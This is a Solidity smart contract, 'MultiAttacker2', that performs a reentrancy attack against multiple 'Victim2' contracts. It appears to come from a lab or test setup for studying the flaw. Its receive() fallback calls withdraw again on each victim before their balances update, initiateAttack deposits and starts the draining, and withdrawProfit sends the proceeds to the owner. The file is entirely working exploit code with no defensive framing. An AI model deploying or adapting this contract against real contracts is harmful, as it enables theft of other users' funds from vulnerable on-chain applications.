// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim2.sol";

contract MultiAttacker2 {
    Victim2[] public victims;
    address public owner;

    uint256[] public withdrawAmounts;
    uint256[] public numCalls;
    uint256[] public callCounts;

    constructor(address[] memory _victims) {
        for (uint i = 0; i < _victims.length; i++) {
            victims.push(Victim2(_victims[i]));
        }
        owner = msg.sender;
        callCounts = new uint256[](_victims.length);
    }

    receive() external payable {
        for (uint i = 0; i < victims.length; i++) {
            if (
                callCounts[i] < numCalls[i] &&
                address(victims[i]).balance >= withdrawAmounts[i] &&
                victims[i].balances(address(this)) >= withdrawAmounts[i]
            ) {
                callCounts[i]++;
                victims[i].withdraw(withdrawAmounts[i]);
            }
        }
    }

    function initiateAttack(uint256[] calldata _amounts, uint256[] calldata _calls) external payable {
        require(msg.sender == owner, "Only owner");
        require(_amounts.length == victims.length && _calls.length == victims.length, "Array length mismatch");
        withdrawAmounts = _amounts;
        numCalls = _calls;
        for (uint i = 0; i < victims.length; i++) {
            callCounts[i] = 0;
            victims[i].deposit{value: _amounts[i]}();
        }
        // Start the attack on each victim in sequence
        for (uint i = 0; i < victims.length; i++) {
            victims[i].withdraw(_amounts[i]);
        }
    }

    function withdrawProfit() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}